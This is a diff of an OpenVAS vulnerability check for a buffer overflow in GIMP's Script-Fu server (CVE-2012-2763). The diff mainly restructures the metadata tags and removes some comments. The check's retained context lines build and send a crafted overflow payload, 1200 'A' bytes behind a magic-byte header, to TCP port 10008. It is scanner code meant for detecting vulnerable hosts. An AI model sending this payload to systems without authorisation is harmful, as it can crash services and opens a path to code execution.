@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_gimp_script_fu_bof_vuln.nasl 4690 2016-12-06 14:44:58Z cfi $
+# $Id: gb_gimp_script_fu_bof_vuln.nasl 11357 2018-09-12 10:57:05Z asteins $
 #
 # GIMP Script-Fu Server Buffer Overflow Vulnerability
 #
@@ -27,12 +27,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802878");
-  script_version("$Revision: 4690 $");
+  script_version("$Revision: 11357 $");
   script_cve_id("CVE-2012-2763");
   script_bugtraq_id(53741);
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2016-12-06 15:44:58 +0100 (Tue, 06 Dec 2016) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-12 12:57:05 +0200 (Wed, 12 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-06-27 13:12:09 +0530 (Wed, 27 Jun 2012)");
   script_name("GIMP Script-Fu Server Buffer Overflow Vulnerability");
   script_category(ACT_DENIAL);
@@ -47,28 +47,16 @@ if(description)
   script_xref(name:"URL", value:"http://packetstormsecurity.org/files/113201/GIMP-script-fu-Server-Buffer-Overflow.html");
   script_xref(name:"URL", value:"http://www.reactionpenetrationtesting.co.uk/advisories/scriptfu-buffer-overflow-GIMP-2.6.html");
 
-  tag_impact = "Successful exploitation will allow attackers to gain control of EIP and
-  potentially execute arbitrary code.
-
-  Impact Level: System/Application";
-
-  tag_affected = "GIMP version 2.6.12 and prior";
-
-  tag_insight = "The script-fu server process in GIMP fails to handle a specially crafted
+  script_tag(name:"impact", value:"Successful exploitation will allow attackers to gain control of EIP and
+  potentially execute arbitrary code.");
+  script_tag(name:"affected", value:"GIMP version 2.6.12 and prior");
+  script_tag(name:"insight", value:"The script-fu server process in GIMP fails to handle a specially crafted
   command input sent to TCP port 10008, which could be exploited by remote
-  attackers to cause a buffer overflow.";
-
-  tag_solution = "Upgrade to GIMP version 2.8.0 or later,
-  For updates refer to http://www.gimp.org/";
-
-  tag_summary = "This host is running GIMP Script-Fu Server and is prone to buffer
-  overflow vulnerability.";
-
-  script_tag(name:"impact", value:tag_impact);
-  script_tag(name:"affected", value:tag_affected);
-  script_tag(name:"insight", value:tag_insight);
-  script_tag(name:"solution", value:tag_solution);
-  script_tag(name:"summary", value:tag_summary);
+  attackers to cause a buffer overflow.");
+  script_tag(name:"solution", value:"Upgrade to GIMP version 2.8.0 or later,
+  For updates refer to http://www.gimp.org/");
+  script_tag(name:"summary", value:"This host is running GIMP Script-Fu Server and is prone to buffer
+  overflow vulnerability.");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_vul");
@@ -76,12 +64,6 @@ if(description)
   exit(0);
 }
 
-
-## Variable Initialization
-res  = "";
-exploit = "";
-soc  = 0;
-port = 0;
 
 ## Default Realwin Port
 port = 10008;
@@ -102,7 +84,6 @@ send(socket:soc, data: testmsg);
 res = recv_line(socket:soc, length:100);
 res = hexstr(res);
 
-## Check the response first byte 0x47 (Magic byte 'G')
 ## and second byte 0x00 for error (0 on success, 1 on error)
 if(!res || !(res =~ "^470100"))
 {
@@ -110,7 +91,6 @@ if(!res || !(res =~ "^470100"))
  exit(0);
 }
 
-## Construct Crafted Exploit and Send
 exploit = crap(data:"A", length: 1200);
 exploit = '\x47\x04\xB0' + exploit;
 
